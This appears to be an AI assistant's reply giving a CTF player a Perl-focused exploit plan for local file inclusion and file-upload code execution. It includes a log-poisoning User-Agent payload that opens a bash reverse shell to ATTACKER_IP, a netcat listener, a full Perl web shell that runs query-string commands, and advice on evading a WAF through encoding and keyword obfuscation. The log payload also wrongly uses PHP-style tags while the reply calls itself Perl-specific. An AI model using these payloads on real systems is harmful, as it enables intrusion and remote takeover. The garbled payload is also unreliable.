You're absolutely right to ask that — if the CTF environment is built using **vulnerable Perl modules**, then PHP-specific payloads (like `php://filter` or `phpinfo()` tricks) are irrelevant and will not work.

Let me now give you a **refined, 100% Perl-focused exploit strategy** for both **LFI** and **File Upload RCE** in the given context. Since it's a CTF and you're told the system has:

- LFI
- File Upload RCE
- Web Application Firewall (WAF)
- Flag ID: `20c08b01-b30a-4580-95ce-12506c1283ad`
- Flag format: `P3RL_B3AST`

## 🔥 Exploit Strategy Based on Perl Backend

---

### 🧨 1. **LFI Exploit (Perl-Focused)**

If you’ve identified an LFI like:

```
http://target.com/page.pl?file=../../../../etc/passwd
```

### ✅ Goal:

Use LFI to:

- Read system files (like `/etc/passwd`)
- Look for logs or temp files you can include
- Extract uploaded shell (if File Upload is possible)

---

### 🔎 Perl LFI - Try Common Paths:

```bash
/etc/passwd
/proc/self/environ
/proc/version
/var/log/apache2/access.log
/var/log/httpd/access_log
/tmp/filename
```

> Use LFI to include log files where you **inject Perl shell code** via User-Agent or other headers.

---

### 👾 Perl Reverse Shell Injection via Apache Logs (if accessible)

**Step 1: Inject Perl code in headers** Use Burp Repeater to send:

```
User-Agent: PerlShell<?system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");>
```

**Step 2: LFI load the log file**

```bash
http://target.com/page.pl?file=/var/log/apache2/access.log
```

And catch the reverse shell using:

```bash
nc -lvnp PORT
```

---

### 🔥 2. **File Upload → RCE (Perl-focused)**

If file upload is possible and **Perl scripts are executed**, try uploading `.pl` files or `.cgi`.

### 💣 Example Perl Web Shell:

Upload file named `shell.pl` or `shell.cgi`:

```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "<pre>";
my $cmd = $ENV{'QUERY_STRING'};
system($cmd);
print "</pre>";
```

Then access it:

```
http://target.com/uploads/shell.pl?ls+-la+/var/www
```

If `.pl` doesn't work, try `.cgi`.

---

### ⚙️ Post-Exploitation: Search for the Flag

Use this in your web shell:

```bash
find / -name "*20c08b01*" 2>/dev/null
```

Or:

```bash
grep -r "P3RL_B3AST" / 2>/dev/null
```

---

### 🧱 Bypass WAF

- URL encode payloads:
    
    ```
    ../../../../etc/passwd → ..%2F..%2F..%2F..%2Fetc%2Fpasswd
    ```
    
- Try Base64 encoding or double encoding
- Avoid known keywords (`eval`, `exec`, `system`) — encode/obfuscate them in Perl

---

### 🧪 Final Exploit Checklist for CTF:

✅ Check for LFI with traversal paths  
✅ Inject Perl shell via log poisoning  
✅ Use uploaded `.pl` or `.cgi` shells if upload is allowed  
✅ Use `find` or `grep` to locate flag  
✅ Ensure reverse shell works — Netcat ready  
✅ Take screenshots of each key step (LFI, shell access, flag found)
